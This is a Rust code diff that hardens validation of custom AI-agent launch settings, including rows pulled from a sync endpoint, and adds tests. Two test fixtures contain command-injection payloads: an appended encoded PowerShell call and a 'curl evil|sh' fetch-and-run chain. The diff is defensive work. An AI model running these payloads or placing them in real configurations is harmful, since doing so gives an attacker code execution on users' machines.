@@ -87,18 +87,17 @@ fn validate_arg(arg: &str) -> Result<(), String> {
     Ok(())
 }
 
-/// Every rule from spec section 5.2. Returns the first violation as a plain
-/// message; callers wrap it in `error_reporter::user_err`.
-pub fn validate(agent: &CustomAgent) -> Result<(), String> {
-    let name = agent.name.trim();
-    if name.is_empty() || name.chars().count() > 40 {
-        return Err("Display name must be 1-40 characters".to_string());
-    }
-    validate_binary(&agent.binary)?;
-    for a in &agent.default_args {
-        validate_arg(a)?;
-    }
-    if let Some(tpl) = &agent.resume_flag {
+/// The rules guarding what reaches the PTY spawn: the command, the resume
+/// template, and the env var names a key is injected into. Enforced on every
+/// save, on every row pulled from sync (a synced row is remote input, not
+/// something this device validated), and again right before spawning.
+pub fn validate_launch_fields(
+    binary: &str,
+    resume_flag: Option<&str>,
+    required_env: &[String],
+) -> Result<(), String> {
+    validate_binary(binary)?;
+    if let Some(tpl) = resume_flag {
         let t = tpl.trim();
         if t.is_empty() {
             return Err("Resume flag cannot be blank; leave it unset instead".to_string());
@@ -112,16 +111,44 @@ pub fn validate(agent: &CustomAgent) -> Result<(), String> {
             validate_arg(tok)?;
         }
     }
-    if !ALLOWED_COLORS.contains(&agent.color.as_str()) {
-        return Err("Tile colour must be one of the offered swatches".to_string());
-    }
-    for env in &agent.required_env {
+    for env in required_env {
         if !is_valid_env_name(env) {
             return Err(format!("\"{}\" is not a valid environment variable name", env));
         }
         if is_blocked_env(env) {
             return Err(format!("\"{}\" cannot be set by an agent", env));
         }
+    }
+    Ok(())
+}
+
+/// Launch-field check for a custom agent row pulled from `/api/sync/pull`
+/// (camelCase wire shape). `defaultArgs` and `bindings` are device-local and
+/// never synced, so they are not part of the row.
+pub fn validate_pulled_row(row: &serde_json::Value) -> Result<(), String> {
+    let binary = row.get("binary").and_then(|v| v.as_str()).unwrap_or("");
+    let resume_flag = row.get("resumeFlag").and_then(|v| v.as_str());
+    let required_env: Vec<String> = match row.get("requiredEnv") {
+        None | Some(serde_json::Value::Null) => Vec::new(),
+        Some(v) => serde_json::from_value(v.clone())
+            .map_err(|_| "requiredEnv is not a list of names".to_string())?,
+    };
+    validate_launch_fields(binary, resume_flag, &required_env)
+}
+
+/// Every rule from spec section 5.2. Returns the first violation as a plain
+/// message; callers wrap it in `error_reporter::user_err`.
+pub fn validate(agent: &CustomAgent) -> Result<(), String> {
+    let name = agent.name.trim();
+    if name.is_empty() || name.chars().count() > 40 {
+        return Err("Display name must be 1-40 characters".to_string());
+    }
+    validate_launch_fields(&agent.binary, agent.resume_flag.as_deref(), &agent.required_env)?;
+    for a in &agent.default_args {
+        validate_arg(a)?;
+    }
+    if !ALLOWED_COLORS.contains(&agent.color.as_str()) {
+        return Err("Tile colour must be one of the offered swatches".to_string());
     }
     let mut seen: std::collections::HashSet<&str> = std::collections::HashSet::new();
     for b in &agent.bindings {
@@ -244,6 +271,37 @@ mod tests {
         let mut a = ok_agent();
         a.binary = "   ".into();
         assert!(validate(&a).unwrap_err().contains("Command is required"));
+    }
+
+    #[test]
+    fn pulled_row_with_injected_binary_is_rejected() {
+        let row = serde_json::json!({ "binary": "claude & powershell -enc AAAA", "requiredEnv": [] });
+        assert!(validate_pulled_row(&row).unwrap_err().contains("Invalid character in command"));
+    }
+
+    #[test]
+    fn pulled_row_with_injected_resume_flag_is_rejected() {
+        let row = serde_json::json!({ "binary": "/bin/bash", "resumeFlag": "-c {id};curl evil|sh" });
+        assert!(validate_pulled_row(&row).unwrap_err().contains("Invalid character in argument"));
+    }
+
+    #[test]
+    fn pulled_row_cannot_target_blocked_env() {
+        let row = serde_json::json!({ "binary": "opencode", "requiredEnv": ["PATH"] });
+        assert!(validate_pulled_row(&row).unwrap_err().contains("cannot be set"));
+        let bad_shape = serde_json::json!({ "binary": "opencode", "requiredEnv": "PATH" });
+        assert!(validate_pulled_row(&bad_shape).is_err());
+    }
+
+    #[test]
+    fn valid_pulled_row_passes() {
+        let row = serde_json::json!({
+            "binary": "opencode", "resumeFlag": "--session {id}",
+            "requiredEnv": ["OPENAI_API_KEY"], "name": "OpenCode", "color": "#30C55E",
+        });
+        assert!(validate_pulled_row(&row).is_ok());
+        let minimal = serde_json::json!({ "binary": "opencode", "resumeFlag": null, "requiredEnv": null });
+        assert!(validate_pulled_row(&minimal).is_ok());
     }
 
     #[test]
